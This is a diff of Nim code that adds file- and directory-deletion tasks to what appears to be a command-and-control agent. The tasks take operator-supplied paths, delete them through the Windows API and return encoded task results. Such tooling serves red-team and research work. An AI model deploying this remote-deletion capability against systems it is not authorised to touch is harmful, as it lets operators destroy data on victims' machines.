@@ -210,3 +210,55 @@ proc taskDir*(task: Task): TaskResult =
             data: encode(fmt"An error occured: {err.msg}" & "\n"),
             status: Failed 
         )
+
+# Remove file 
+proc taskRm*(task: Task): TaskResult = 
+
+    let target = task.args.join(" ").replace("\"", "").replace("'", "")
+    echo fmt"Deleting {target}."
+
+    try: 
+        # Get current working directory using GetCurrentDirectory
+        if DeleteFile(target) == FALSE:         
+            raise newException(OSError, fmt"Failed to delete file ({GetLastError()}).")
+
+        return TaskResult(
+            task: task.id, 
+            agent: task.agent, 
+            data: encode(""),
+            status: Completed
+        )
+
+    except CatchableError as err: 
+        return TaskResult(
+            task: task.id, 
+            agent: task.agent, 
+            data: encode(fmt"An error occured: {err.msg}" & "\n"),
+            status: Failed 
+        )
+
+# Remove directory
+proc taskRmdir*(task: Task): TaskResult = 
+
+    let target = task.args.join(" ").replace("\"", "").replace("'", "")
+    echo fmt"Deleting {target}."
+
+    try: 
+        # Get current working directory using GetCurrentDirectory
+        if RemoveDirectoryA(target) == FALSE:         
+            raise newException(OSError, fmt"Failed to delete directory ({GetLastError()}).")
+
+        return TaskResult(
+            task: task.id, 
+            agent: task.agent, 
+            data: encode(""),
+            status: Completed
+        )
+
+    except CatchableError as err: 
+        return TaskResult(
+            task: task.id, 
+            agent: task.agent, 
+            data: encode(fmt"An error occured: {err.msg}" & "\n"),
+            status: Failed 
+        )
